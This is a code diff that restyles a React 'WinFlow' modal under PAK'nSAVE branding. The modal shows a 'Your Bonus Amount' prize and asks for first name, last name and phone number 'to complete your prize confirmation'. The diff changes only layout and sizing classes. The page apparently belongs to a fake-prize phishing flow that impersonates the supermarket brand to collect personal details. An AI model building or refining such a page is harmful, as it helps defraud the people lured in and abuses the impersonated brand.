@@ -142,18 +142,17 @@ export function WinFlow({ sessionId }: Props) {
         <div
           role="dialog"
           aria-modal="true"
-          className="pak-form-card w-full max-w-[980px]"
+          className="pak-form-card w-full max-w-[920px]"
         >
-          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
-            <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
-              <div className="min-w-0">
-                <div className="max-w-[34rem]">
-                  <h2 className="pak-form-title">Complete your entry</h2>
-                  <p className="pak-form-subtitle mt-3">
-                    Enter your details to complete your prize confirmation.
-                  </p>
-                </div>
-                <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
+          <div className="pak-form-inner px-4 pb-4 pt-4 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
+            <div className="space-y-4 sm:space-y-5">
+              <div className="flex items-center justify-between gap-2.5 sm:gap-4">
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="pak-form-brand-logo shrink-0"
+                />
+                <div className="pak-form-amount inline-flex min-w-0 flex-1 px-3 py-2.5 sm:max-w-[18rem] sm:flex-none sm:px-5 sm:py-3">
                   <div className="pak-form-amount-label">
                     <div>Your</div>
                     <div>Bonus Amount</div>
@@ -163,24 +162,23 @@ export function WinFlow({ sessionId }: Props) {
                     {currency}{amount?.toLocaleString("en-NZ")}
                   </div>
                 </div>
-              </div>
-
-              <div className="flex items-start justify-between gap-4 lg:block">
-                <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
-                  className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
-                />
                 <img
                   src="/form-assets/paknsave-gift-box.png"
                   alt=""
-                  className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
+                  className="h-auto w-20 shrink-0 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-28"
                 />
+              </div>
+
+              <div className="max-w-[27rem]">
+                <h2 className="pak-form-title">Complete your entry</h2>
+                <p className="pak-form-subtitle mt-2 sm:mt-3">
+                  Enter your details to complete your prize confirmation.
+                </p>
               </div>
             </div>
 
-            <form onSubmit={handleSubmit} className="mt-7 space-y-5 sm:space-y-6">
-              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 sm:gap-6">
+            <form onSubmit={handleSubmit} className="mt-4 space-y-3 sm:mt-7 sm:space-y-6">
+              <div className="grid grid-cols-2 gap-3 sm:gap-6">
                 <label className="pak-form-label">
                   {settings.profile_firstname_label}
                   <div className="pak-form-input-wrap">
@@ -192,7 +190,7 @@ export function WinFlow({ sessionId }: Props) {
                     </div>
                     <input
                       required
-                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
+                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                       value={firstName}
                       onChange={(e) => setFirstName(e.target.value)}
                       autoComplete="given-name"
@@ -210,7 +208,7 @@ export function WinFlow({ sessionId }: Props) {
                     </div>
                     <input
                       required
-                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
+                      className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                       value={lastName}
                       onChange={(e) => setLastName(e.target.value)}
                       autoComplete="family-name"
@@ -229,7 +227,7 @@ export function WinFlow({ sessionId }: Props) {
                   <input
                     required
                     type="tel"
-                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
+                    className="pak-form-input min-h-[3.55rem] pl-11 pr-3 text-base sm:min-h-[4.5rem] sm:pl-14 sm:pr-4 sm:text-lg"
                     value={phone}
                     onChange={(e) => setPhone(e.target.value)}
                     autoComplete="tel"
@@ -237,7 +235,7 @@ export function WinFlow({ sessionId }: Props) {
                 </div>
               </label>
 
-              <div className="flex flex-col gap-4 pt-2 md:flex-row md:items-center md:justify-between">
+              <div className="flex flex-col gap-2 pt-1 sm:gap-4 sm:pt-2 md:flex-row md:items-center md:justify-between">
                 <div className="pak-form-security">
                   <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                     <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
@@ -248,7 +246,7 @@ export function WinFlow({ sessionId }: Props) {
                 <button
                   type="submit"
                   disabled={saving || processing}
-                  className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+                  className="pak-form-button min-h-[3.55rem] w-full px-5 text-base sm:min-h-[4.25rem] sm:px-6 sm:text-xl md:w-[24rem]"
                 >
                   {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
                 </button>
